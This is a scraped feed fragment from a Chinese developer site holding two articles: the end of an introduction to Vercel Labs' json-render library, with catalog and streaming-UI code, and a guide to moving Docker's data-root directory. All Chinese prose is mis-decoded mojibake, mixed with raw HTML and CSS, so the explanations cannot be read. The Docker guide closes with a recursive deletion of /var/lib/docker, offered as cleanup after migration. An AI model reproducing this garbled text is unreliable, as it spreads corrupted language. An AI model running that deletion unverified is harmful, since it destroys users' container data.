<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/900ab324c3114c3b932f8f96627d54d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5pif5o6i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769574160&amp;x-signature=P%2FySEG114%2Bn%2F36QU%2FNXQSf9u7oY%3D" alt="" loading="lazy"/>
ç©¶å…¶åŸå› æ˜¯ç”±äº Vercel æå…¶ç²¾å‡†åœ°è¸©ä¸­äº†å½“å‰ AI åº”ç”¨å¼€å‘æœ€å¤§çš„ä¸€ä¸ªç—›ç‚¹ï¼š<strong>ç”Ÿæˆå¼UIä¸å¯æ§</strong>ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬è®© AI å†™ç•Œé¢ï¼ŒUI ç»“æ„ä¸€ä¼šå„¿ä¸€ä¸ªæ ·ï¼Œç»„ä»¶ä¹±é£ï¼Œè¾“å‡ºä¸å¯é¢„æµ‹ã€‚Vercel Labs å‘å¸ƒçš„ <strong>json-render</strong>ï¼Œç”¨ä¸€ç§æå…¶ä¼˜é›…çš„å·¥ç¨‹åŒ–æ€è·¯è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><strong>æ ¸å¿ƒå…¬å¼ï¼šAI â†’ JSON â†’ UI</strong></p>
<p>å®ƒä¸å†è®© AI ç›´æ¥å†™ä»£ç ï¼Œè€Œæ˜¯è®© AI ç”Ÿæˆç¬¦åˆç‰¹å®š Schema çš„ JSON æ•°æ®ï¼Œç„¶åå‰ç«¯æ ¹æ®è¿™ä¸ª JSONï¼Œåˆ©ç”¨ä½ å·²ç»å†™å¥½çš„ç»„ä»¶è¿›è¡Œæ¸²æŸ“ã€‚</p>
<p>å®ƒç¬¬ä¸€æ¬¡æŠŠâ€œAI ç”Ÿæˆ UIâ€è¿™ä»¶äº‹ï¼ŒçœŸæ­£æ‹‰è¿›äº†å·¥ç¨‹å¯æ§ã€å¯å®¡è®¡ã€å¯è§„æ¨¡åŒ–çš„ç”Ÿäº§æµç¨‹ã€‚</p>
<h4 data-id="heading-0">æ ¸å¿ƒæœºåˆ¶</h4>
<p>è¿™ä¸ªé¡¹ç›®çš„ç²¾é«“åœ¨äºâ€œçº¦æŸâ€ä¸â€œæµå¼â€çš„ç»“åˆã€‚</p>
<p>â‘  Catalog</p>
<p>ä½ éœ€è¦å…ˆå®šä¹‰ä¸€ä¸ª <code>catalog</code>ï¼Œå‘Šè¯‰ AIï¼š</p>
<ul>
<li>å…è®¸ä½¿ç”¨å“ªäº›ç»„ä»¶</li>
<li>æ¯ä¸ªç»„ä»¶æœ‰å“ªäº› propsï¼ˆå±æ€§ï¼‰</li>
<li>props çš„ç±»å‹ã€ç»“æ„ã€æšä¸¾èŒƒå›´</li>
<li>èƒ½è§¦å‘å“ªäº› action</li>
</ul>
<p>æ¯”å¦‚ï¼š</p>
<ul>
<li>åªèƒ½ç”¨ LineChartã€StatCardã€DataTable</li>
<li>LineChart åªèƒ½æ¥æ”¶ data å’Œ color ä¸¤ä¸ªå‚æ•°ã€‚</li>
<li>ä¸å…è®¸è‡ªç”±å†™ JSXã€ä¸å…è®¸èƒ¡ç¼–ç»„ä»¶</li>
</ul>
<p>AI åœ¨ç”Ÿæˆæ—¶ï¼Œåªèƒ½åœ¨è¿™ä¸ªæ¸…å•é‡Œé€‰ç»„ä»¶ï¼Œåªèƒ½å¡«è¿™äº›å‚æ•°ï¼Œå¹¶ç”Ÿæˆæ ‡å‡†çš„ Schema ç”¨ä»¥æ ¡éªŒã€‚ä»¥æ­¤æ¥å½»åº•æ¶ˆç­å¹»è§‰ï¼ŒAI ç»å¯¹ä¸ä¼šç»™ä½ ç”Ÿæˆä¸€ä¸ªä½ æ²¡å®šä¹‰çš„ 3DMap ç»„ä»¶ã€‚</p>
<p>â‘¡ æµå¼æ¸²æŸ“</p>
<p>ä¼ ç»Ÿçš„åšæ³•æ˜¯ï¼šç­‰ AI æŠŠ JSON å…¨éƒ¨ç”Ÿæˆå®Œ -&gt; JSON.parse -&gt; æ¸²æŸ“ã€‚è¿™ä¸­é—´ä¼šæœ‰å‡ ç§’é’Ÿçš„ç™½å±æˆ–åŠ è½½åŠ¨ç”»ã€‚</p>
<p>json-render æ”¯æŒå¢é‡è§£æã€‚AI åå‡ºç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç•Œé¢ä¸Šå¯èƒ½å°±å·²ç»å¼€å§‹å‡†å¤‡æ¸²æŸ“å¡ç‰‡äº†ã€‚</p>
<p>ç”¨æˆ·æ„Ÿè§‰åˆ°çš„å°±æ˜¯ï¼šå­—è¿˜æ²¡æ‰“å®Œï¼Œç•Œé¢å°±å·²ç»è·³å‡ºæ¥äº†ã€‚è¿™ç§â€œæ— ç­‰å¾…â€çš„ä½“éªŒå¯¹äº B ç«¯æ¥è¯´è‡³å…³é‡è¦ã€‚</p>
<p>â‘¢ åå‘ç”Ÿæˆæºç </p>
<p>è¿™æ˜¯ Vercel æœ€æ‡‚å¼€å‘è€…çš„åœ°æ–¹ã€‚AI ç”Ÿæˆçš„ä¸ä»…æ˜¯è¿è¡Œæ—¶çš„ç•Œé¢ï¼Œå®ƒè¿˜å†…ç½®äº†ä¸€ä¸ªç¼–è¯‘å™¨ã€‚</p>
<p>å®ƒèƒ½åŸºäºå½“å‰çš„ JSON å’Œä½ çš„ Catalogï¼Œåå‘ç”Ÿæˆä¸€ä»½æ ‡å‡†çš„ React æºç ã€‚ä½ å¯ä»¥ç›´æ¥æŠŠè¿™æ®µä»£ç ä¸‹è½½åˆ°ä½ çš„æœ¬åœ°å»éƒ¨ç½²ã€‚</p>
<h4 data-id="heading-1">å¿«é€Ÿå…¥æ‰‹</h4>
<p>å®˜æ–¹å·²æœ‰ä¸€ä¸ªçº¿ä¸Šå¯ä»¥æ¼”ç¤ºçš„æœåŠ¡ï¼Œæµè§ˆå™¨è¾“å…¥ <code>json-render.dev</code> å°±å¯ä½“éªŒã€‚</p>
<p>æ¯”å¦‚æˆ‘æƒ³ï¼šåˆ›å»ºä¸€ä¸ªå¡ç‰‡å¼AIæ™ºèƒ½å¯¼èˆªç«™ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/223b70ad806240d6b4b102732f0e5054~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5pif5o6i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769574160&amp;x-signature=M91ZSEpSjRkAIjNa6%2FixocA4MyQ%3D" alt="" loading="lazy"/>
ä»–å°±èƒ½ç«‹é©¬ç»™æˆ‘è®¾è®¡ä¸€ä¸ªé€šè¿‡å†…ç½®è§„å®šçš„ä¸€äº›ç»„ä»¶ï¼Œä»¥æ­¤ç”Ÿæˆ JSON æ•°æ®ï¼Œå†æ¸²æŸ“åˆ°é¡µé¢ä¸Šã€‚</p>
<p>ä¹Ÿå¯ä»¥å°†å…³é”®ä»£ç æ‹·è´æˆ–ä¸‹è½½è¿›è¡Œæœ¬åœ°å¤ç”¨ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/facc952f299a4329ab0e10649c5bddf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5pif5o6i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769574160&amp;x-signature=4G2RjHABpn5CP38VRhGH%2F2jlq%2F8%3D" alt="" loading="lazy"/>
å¦‚æœæƒ³è¦åœ¨æœ¬åœ°æ­å»ºæ¼”ç¤ºæœåŠ¡ï¼Œå¯æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">gitÂ <span class="hljs-built_in">clone</span>Â https://github.com/vercel-labs/json-render  
<span class="hljs-built_in">cd</span>Â json-render  
pnpm install  
pnpm dev
</code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><code>http://localhost:3000</code> â€” æ–‡æ¡£å’Œæ¼”ç¤ºåŒº</li>
<li><code>http://localhost:3001</code> â€” ç¤ºä¾‹ä»ªè¡¨æ¿</li>
</ul>
<p>å¦‚è¦åœ¨ä½ å®é™…çš„é¡¹ç›®ä¸­å¼•å…¥è¯¥åŠŸèƒ½ï¼Œéœ€è¦å®‰è£… json-renderã€‚</p>
<p>å®‰è£…æŒ‡ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install @json-render/core @json-render/react
</code></pre>
<p>å®šä¹‰Catalogï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span>Â { createCatalog }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'@json-render/core'</span>;  
<span class="hljs-keyword">import</span>Â { z }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'zod'</span>;  
  
<span class="hljs-keyword">const</span>Â catalog =Â <span class="hljs-title function_">createCatalog</span>({  
Â  <span class="hljs-attr">components</span>: {  
Â  Â  <span class="hljs-title class_">Card</span>: {  
Â  Â  Â  <span class="hljs-attr">props</span>: z.<span class="hljs-title function_">object</span>({Â <span class="hljs-attr">title</span>: z.<span class="hljs-title function_">string</span>() }),  
Â  Â  Â  <span class="hljs-attr">hasChildren</span>:Â <span class="hljs-literal">true</span>,  
Â  Â  },  
Â  Â  <span class="hljs-title class_">Metric</span>: {  
Â  Â  Â  <span class="hljs-attr">props</span>: z.<span class="hljs-title function_">object</span>({  
Â  Â  Â  Â  <span class="hljs-attr">label</span>: z.<span class="hljs-title function_">string</span>(),  
Â  Â  Â  Â  <span class="hljs-attr">valuePath</span>: z.<span class="hljs-title function_">string</span>(),Â  Â  Â  <span class="hljs-comment">// Binds to your data  </span>
Â  Â  Â  Â  <span class="hljs-attr">format</span>: z.<span class="hljs-title function_">enum</span>([<span class="hljs-string">'currency'</span>,Â <span class="hljs-string">'percent'</span>,Â <span class="hljs-string">'number'</span>]),  
Â  Â  Â  }),  
Â  Â  },  
Â  Â  <span class="hljs-title class_">Button</span>: {  
Â  Â  Â  <span class="hljs-attr">props</span>: z.<span class="hljs-title function_">object</span>({  
Â  Â  Â  Â  <span class="hljs-attr">label</span>: z.<span class="hljs-title function_">string</span>(),  
Â  Â  Â  Â  <span class="hljs-attr">action</span>:Â <span class="hljs-title class_">ActionSchema</span>,Â  Â  Â  Â  <span class="hljs-comment">// AI declares intent, you handle it  </span>
Â  Â  Â  }),  
Â  Â  },  
Â  },  
Â  <span class="hljs-attr">actions</span>: {  
Â  Â  <span class="hljs-attr">export_report</span>: {Â <span class="hljs-attr">description</span>:Â <span class="hljs-string">'Export dashboard to PDF'</span>Â },  
Â  Â  <span class="hljs-attr">refresh_data</span>: {Â <span class="hljs-attr">description</span>:Â <span class="hljs-string">'Refresh all metrics'</span>Â },  
Â  },  
});
</code></pre>
<p>æ³¨å†Œç»„ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span>Â registry = {  
Â  <span class="hljs-title class_">Card</span>:Â <span class="hljs-function">(<span class="hljs-params">{ element, children }</span>) =&gt;</span>Â (  
Â  Â Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">className</span>=<span class="hljs-string">"card"</span>&gt;</span>  
Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{element.props.title}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>  
Â  Â  Â  {children}  
Â  Â  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>  
Â  ),  
Â  <span class="hljs-title class_">Metric</span>:Â <span class="hljs-function">(<span class="hljs-params">{ element }</span>) =&gt;</span>Â {  
Â  Â  <span class="hljs-keyword">const</span>Â value =Â <span class="hljs-title function_">useDataValue</span>(element.<span class="hljs-property">props</span>.<span class="hljs-property">valuePath</span>);  
Â  Â  <span class="hljs-keyword">return</span>Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">className</span>=<span class="hljs-string">"metric"</span>&gt;</span>{format(value)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;  
Â  },  
Â  <span class="hljs-title class_">Button</span>:Â <span class="hljs-function">(<span class="hljs-params">{ element, onAction }</span>) =&gt;</span>Â (  
Â  Â Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span>Â =&gt;</span>Â onAction(element.props.action)}&gt;  
Â  Â  Â  {element.props.label}  
Â  Â  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>  
Â  ),  
};
</code></pre>
<p>AI ç”Ÿæˆï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span>Â {Â <span class="hljs-title class_">DataProvider</span>,Â <span class="hljs-title class_">ActionProvider</span>,Â <span class="hljs-title class_">Renderer</span>, useUIStream }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'@json-render/react'</span>;  
  
<span class="hljs-keyword">function</span>Â <span class="hljs-title function_">Dashboard</span>(<span class="hljs-params"/>) {  
Â  <span class="hljs-keyword">const</span>Â { tree, send } =Â <span class="hljs-title function_">useUIStream</span>({Â <span class="hljs-attr">api</span>:Â <span class="hljs-string">'/api/generate'</span>Â });  
  
Â  <span class="hljs-keyword">return</span>Â (  
Â  Â Â <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span>Â <span class="hljs-attr">initialData</span>=<span class="hljs-string">{{</span>Â <span class="hljs-attr">revenue:</span>Â <span class="hljs-attr">125000</span>,Â <span class="hljs-attr">growth:</span>Â <span class="hljs-attr">0.15</span>Â }}&gt;</span>  
Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">ActionProvider</span>Â <span class="hljs-attr">actions</span>=<span class="hljs-string">{{</span>  
Â  Â  Â  Â  <span class="hljs-attr">export_report:</span>Â () =&gt;</span>Â downloadPDF(),  
Â  Â  Â  Â  refresh_data: () =&gt; refetch(),  
Â  Â  Â  }}&gt;  
Â  Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">input</span>  
Â  Â  Â  Â  Â  <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Create a revenue dashboard..."</span>  
Â  Â  Â  Â  Â  <span class="hljs-attr">onKeyDown</span>=<span class="hljs-string">{(e)</span>Â =&gt;</span>Â e.key === 'Enter' &amp;&amp; send(e.target.value)}  
Â  Â  Â  Â  /&gt;  
Â  Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">Renderer</span>Â <span class="hljs-attr">tree</span>=<span class="hljs-string">{tree}</span>Â <span class="hljs-attr">components</span>=<span class="hljs-string">{registry}</span>Â /&gt;</span>  
Â  Â  Â  <span class="hljs-tag">&lt;/<span class="hljs-name">ActionProvider</span>&gt;</span>  
Â  Â  <span class="hljs-tag">&lt;/<span class="hljs-name">DataProvider</span>&gt;</span></span>  
Â  );  
}
</code></pre>
<h4 data-id="heading-2">é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>æ•°æ®åˆ†æä»ªè¡¨ç›˜</li>
<li>ç”µå•†è¥é”€é…ç½®åå°</li>
<li>åŠ¨æ€è¡¨å•/é—®å·</li>
<li>å±•ä¼š/å¤§å±å¯è§†åŒ–</li>
<li>å†…éƒ¨è¿è¥å·¥å…·</li>
</ul>
<p>å‡¡æ˜¯ä½ ä¸æƒ³æ‰‹å†™ã€ä½†åˆä¸èƒ½ä¹±å†™ UI çš„åœ°æ–¹ï¼Œjson-render éƒ½æ˜¯éå¸¸ç†æƒ³çš„åº•åº§ã€‚</p>
<h4 data-id="heading-3">å†™åœ¨æœ€å</h4>
<p>AI å¤©ç”Ÿæ˜¯è‡ªç”±å‘æŒ¥å‹é€‰æ‰‹ï¼Œè€Œ UI æ˜¯å¼ºçº¦æŸå·¥ç¨‹äº§ç‰©ã€‚</p>
<p>json-render å¹²çš„äº‹ï¼Œå°±æ˜¯åœ¨è¿™ä¸¤è€…ä¹‹é—´å»ºäº†ä¸€æ¡ã€Œç¡¬ç®¡é“ã€ã€‚</p>
<p>å¯¹äºæˆ‘ä»¬å¼€å‘è€…æ¥è¯´ï¼Œè¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œæ›´æ˜¯ä¸€ç§æ€ç»´æ–¹å¼çš„è½¬å˜ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬å†™å‰ç«¯ï¼Œæ˜¯å†™â€œé¡µé¢â€ï¼›ä»¥åæˆ‘ä»¬å†™å‰ç«¯ï¼Œæ˜¯å†™â€œç»„ä»¶åº“â€å’Œâ€œçº¦æŸè§„åˆ™Schemaâ€ã€‚</p>
<p>è€Œå‰©ä¸‹çš„ç»„è£…å·¥ä½œäº¤ç»™ AI å°±å¥½äº†ã€‚</p>
<p>GitHubï¼š</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Fjson-render" target="_blank" title="https://github.com/vercel-labs/json-render" ref="nofollow noopener noreferrer">github.com/vercel-labsâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¿®æ”¹ Docker é•œåƒï¼ˆimagesï¼‰çš„å­˜å‚¨è·¯å¾„]]></title>    <link>https://juejin.cn/post/7597968460651561002</link>    <guid>https://juejin.cn/post/7597968460651561002</guid>    <pubDate>2026-01-22T06:57:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597968460651561002" data-draft-id="7597739723806523434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¿®æ”¹ Docker é•œåƒï¼ˆimagesï¼‰çš„å­˜å‚¨è·¯å¾„"/> <meta itemprop="keywords" content="Docker"/> <meta itemprop="datePublished" content="2026-01-22T06:57:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·8612485135916"/> <meta itemprop="url" content="https://juejin.cn/user/1093373276480728"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¿®æ”¹ Docker é•œåƒï¼ˆimagesï¼‰çš„å­˜å‚¨è·¯å¾„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1093373276480728/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·8612485135916
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:57:07.000Z" title="Thu Jan 22 2026 06:57:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¦ä¿®æ”¹ Docker é•œåƒï¼ˆimagesï¼‰çš„å­˜å‚¨è·¯å¾„ï¼ˆå³ Docker çš„ <strong>æ•°æ®æ ¹ç›®å½•</strong>ï¼Œé»˜è®¤ä¸º <code>/var/lib/docker</code>ï¼‰ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼å®ç°ã€‚è¿™æ˜¯åœ¨ç£ç›˜ç©ºé—´ä¸è¶³æˆ–å¸Œæœ›å°† Docker æ•°æ®æ”¾åˆ°æ›´å¤§/æ›´å¿«çš„ç£ç›˜æ—¶çš„å¸¸è§æ“ä½œã€‚</p>
<hr/>
<h2 data-id="heading-0">âœ… æ¨èæ–¹æ³•ï¼šä¿®æ”¹ <code>daemon.json</code> é…ç½®ï¼ˆé€‚ç”¨äº systemd ç®¡ç†çš„ç³»ç»Ÿï¼‰</h2>
<h3 data-id="heading-1">æ­¥éª¤ 1ï¼šåœæ­¢ Docker æœåŠ¡</h3>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl stop docker
</code></pre>
<blockquote>
<p>âš ï¸ åœæ­¢åæ‰€æœ‰å®¹å™¨éƒ½ä¼šåœæ­¢ï¼Œè¯·ç¡®ä¿å·²å¤‡ä»½é‡è¦æ•°æ®æˆ–å¯æ¥å—åœæœºã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">æ­¥éª¤ 2ï¼šåˆ›å»ºæ–°ç›®å½•å¹¶è¿ç§»æ•°æ®ï¼ˆå¯é€‰ä½†æ¨èï¼‰</h3>
<p>å‡è®¾ä½ æƒ³æŠŠ Docker æ•°æ®ç§»åˆ° <code>/data/docker</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºæ–°ç›®å½•</span>
sudo <span class="hljs-built_in">mkdir</span> -p /data/docker

<span class="hljs-comment"># ï¼ˆå¯é€‰ï¼‰è¿ç§»ç°æœ‰æ•°æ®ï¼ˆå¦‚æœä½ å·²æœ‰é•œåƒ/å®¹å™¨ï¼‰</span>
sudo rsync -aqxP /var/lib/docker/ /data/docker/
</code></pre>
<blockquote>
<p>ğŸ” ä½¿ç”¨ <code>rsync</code> è€Œä¸æ˜¯ <code>mv</code>ï¼Œå¯ä»¥ä¿ç•™åŸæ•°æ®ä½œä¸ºå¤‡ä»½ï¼Œç›´åˆ°ç¡®è®¤æ–°è·¯å¾„å·¥ä½œæ­£å¸¸ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">æ­¥éª¤ 3ï¼šé…ç½® Docker ä½¿ç”¨æ–°è·¯å¾„</h3>
<p>ç¼–è¾‘æˆ–åˆ›å»º Docker çš„é…ç½®æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/docker/daemon.json
</code></pre>
<p>æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"data-root"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/data/docker"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>ğŸ’¡ å¦‚æœæ–‡ä»¶å·²å­˜åœ¨å…¶ä»–é…ç½®ï¼Œè¯·åˆå¹¶ JSONï¼Œç¡®ä¿æ ¼å¼åˆæ³•ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">æ­¥éª¤ 4ï¼šå¯åŠ¨ Docker å¹¶éªŒè¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨ Docker</span>
sudo systemctl start docker

<span class="hljs-comment"># æ£€æŸ¥çŠ¶æ€</span>
sudo systemctl status docker

<span class="hljs-comment"># æŸ¥çœ‹ Docker æ ¹ç›®å½•æ˜¯å¦ç”Ÿæ•ˆ</span>
docker info | grep <span class="hljs-string">"Docker Root Dir"</span>
</code></pre>
<p>é¢„æœŸè¾“å‡ºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Docker</span> <span class="hljs-title class_">Root</span> <span class="hljs-title class_">Dir</span>: <span class="hljs-regexp">/data/</span>docker
</code></pre>
<hr/>
<h3 data-id="heading-5">æ­¥éª¤ 5ï¼šæ¸…ç†æ—§æ•°æ®ï¼ˆç¡®è®¤æ— è¯¯åï¼‰</h3>
<p>å¦‚æœè¿ç§»æˆåŠŸä¸”è¿è¡Œæ­£å¸¸ï¼Œå¯åˆ é™¤æ—§æ•°æ®é‡Šæ”¾ç©ºé—´ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">rm</span> -rf /var/lib/docker
</code></pre>
